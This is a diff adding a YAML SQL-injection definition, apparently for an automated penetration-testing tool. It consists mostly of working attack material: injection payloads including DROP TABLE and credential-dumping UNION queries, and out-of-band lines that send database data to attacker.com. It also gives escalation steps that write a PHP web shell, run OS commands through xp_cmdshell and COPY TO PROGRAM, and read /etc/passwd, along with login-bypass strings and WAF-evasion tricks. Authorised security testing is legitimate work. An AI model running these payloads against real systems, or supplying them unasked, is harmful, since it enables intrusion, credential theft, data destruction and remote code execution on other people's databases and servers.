@@ -1,0 +1,144 @@
+id: SQLI
+name: SQL Injection
+cwe:
+- CWE-89
+owasp: A03:2021 Injection
+severity_range: High - Critical
+description: User input is incorporated into SQL queries without proper sanitization, allowing attackers to read, modify,
+  or delete database contents, bypass authentication, or execute OS commands.
+detection:
+  payloads:
+    error_based:
+    - ''''
+    - ''''''
+    - '"'
+    - \
+    - ''' OR ''1''=''1'
+    - '" OR "1"="1'
+    - ''' OR ''1''=''1'' --'
+    - ''' OR ''1''=''1'' #'
+    - ''' OR ''1''=''1''/*'
+    - ''') OR (''1''=''1'
+    - ''')) OR ((''1''=''1'
+    - 1' ORDER BY 1--+
+    - 1' ORDER BY 10--+
+    - ''' AND 1=CONVERT(int,@@version)--'
+    - ''' AND 1=1--'
+    - ''' AND 1=2--'
+    - ''' UNION SELECT NULL--'
+    - ''' UNION SELECT NULL,NULL--'
+    - ''' UNION SELECT NULL,NULL,NULL--'
+    blind_boolean:
+    - ''' AND 1=1--'
+    - ''' AND 1=2--'
+    - ''' AND ''a''=''a'
+    - ''' AND ''a''=''b'
+    - ''' AND SUBSTRING(@@version,1,1)=''5''--'
+    - 1 AND 1=1
+    - 1 AND 1=2
+    - ''' AND (SELECT COUNT(*) FROM information_schema.tables)>0--'
+    blind_time:
+    - '''; WAITFOR DELAY ''0:0:5''--'
+    - ''' AND SLEEP(5)--'
+    - ''' AND pg_sleep(5)--'
+    - '''; SELECT pg_sleep(5)--'
+    - 1; WAITFOR DELAY '0:0:5'--
+    - ''' OR SLEEP(5)#'
+    - ''' AND BENCHMARK(5000000,SHA1(''test''))--'
+    - 1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+    union_based:
+    - ''' UNION SELECT NULL--'
+    - ''' UNION SELECT NULL,NULL--'
+    - ''' UNION SELECT NULL,NULL,NULL--'
+    - ''' UNION SELECT 1,2,3--'
+    - ''' UNION SELECT username,password FROM users--'
+    - ''' UNION ALL SELECT NULL,NULL,NULL--'
+    - 0 UNION SELECT 1,2,3--
+    stacked_queries:
+    - '''; DROP TABLE test--'
+    - '''; INSERT INTO logs VALUES(''pwned'')--'
+    - '''; EXEC xp_cmdshell(''whoami'')--'
+    out_of_band:
+    - ''' AND 1=(SELECT LOAD_FILE(CONCAT(''\\\\'',@@version,''.attacker.com\\a'')))--'
+    - '''; EXEC master..xp_dirtree ''\\\\attacker.com\\a''--'
+  error_signatures:
+  - you have an error in your sql syntax
+  - unclosed quotation mark
+  - quoted string not properly terminated
+  - mysql_fetch
+  - mysql_num_rows
+  - mysql_query
+  - pg_query
+  - pg_exec
+  - pg_fetch
+  - sqlite3.operationalerror
+  - sqlite3.warning
+  - microsoft ole db provider for sql server
+  - microsoft odbc sql server driver
+  - ora-01756
+  - ora-00933
+  - ora-00907
+  - sql command not properly ended
+  - invalid query
+  - syntax error
+  - unterminated string
+  - division by zero
+  - sqlstate
+  - jdbc
+  - odbc
+  strategy:
+  - 1. Identify all input points (GET/POST params, cookies, headers, JSON fields)
+  - 2. Test each with a single quote (') and observe error vs normal response
+  - '3. Compare responses for boolean-based: AND 1=1 vs AND 1=2'
+  - '4. If no visible difference, try time-based: SLEEP(5) or WAITFOR DELAY'
+  - 5. Determine column count with ORDER BY incrementing
+  - 6. Use UNION SELECT to extract data once column count is known
+  - 7. Extract database version, current user, database name first
+  - 8. Enumerate tables via information_schema.tables
+  - 9. Extract sensitive data (credentials, PII, tokens)
+  - 10. Test for stacked queries and OS command execution if DBMS supports it
+escalation:
+  data_extraction:
+  - Extract @@version / version() to identify DBMS
+  - Extract current_user() / user() / SYSTEM_USER
+  - Extract database() / current_database()
+  - Enumerate information_schema.tables and information_schema.columns
+  - Extract credentials from users/accounts tables
+  - Look for API keys, tokens, secrets in config tables
+  authentication_bypass:
+  - ''' OR ''1''=''1'' -- (classic bypass)'
+  - admin'-- (bypass password check for known username)
+  - ''' OR 1=1 LIMIT 1-- (login as first user, usually admin)'
+  os_command_execution:
+    mysql: ''' UNION SELECT ''<?php system($_GET["cmd"]); ?>'' INTO OUTFILE ''/var/www/html/shell.php''--'
+    mssql: '''; EXEC xp_cmdshell(''whoami'')--'
+    postgresql: '''; COPY (SELECT '''') TO PROGRAM ''whoami''--'
+  file_read:
+    mysql: ''' UNION SELECT LOAD_FILE(''/etc/passwd'')--'
+    postgresql: ''' UNION SELECT pg_read_file(''/etc/passwd'',0,1000)--'
+waf_bypass:
+- 'Use URL encoding: %27 for single quote'
+- 'Double URL encoding: %2527'
+- 'Use comments: /*!UNION*/ /*!SELECT*/'
+- 'Case variation: uNiOn SeLeCt'
+- 'Use CHAR(): CHAR(39) for single quote'
+- 'Newline injection: %0A between keywords'
+- 'Use /**/ instead of spaces: UNION/**/SELECT'
+- JSON-based injection for JSON input fields
+- HPP (HTTP Parameter Pollution) for param-based WAFs
+evidence_needed: Database error with query fragment, data extraction via UNION, or time delay confirming blind injection
+tools:
+- http_request
+- record_finding
+ai_research_hints:
+- Check if the application uses an ORM and test ORM-specific injection patterns
+- Test JSON/XML input fields for second-order injection
+- Check for NoSQL injection if MongoDB indicators present
+- Test stored procedures for injection if MSSQL detected
+- Look for batch/bulk import endpoints that may bypass parameterization
+references:
+- https://portswigger.net/web-security/sql-injection
+- https://owasp.org/www-community/attacks/SQL_Injection
+- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
+- https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
+- https://hackerone.com/hacktivity?type=team&querystring=sql%20injection
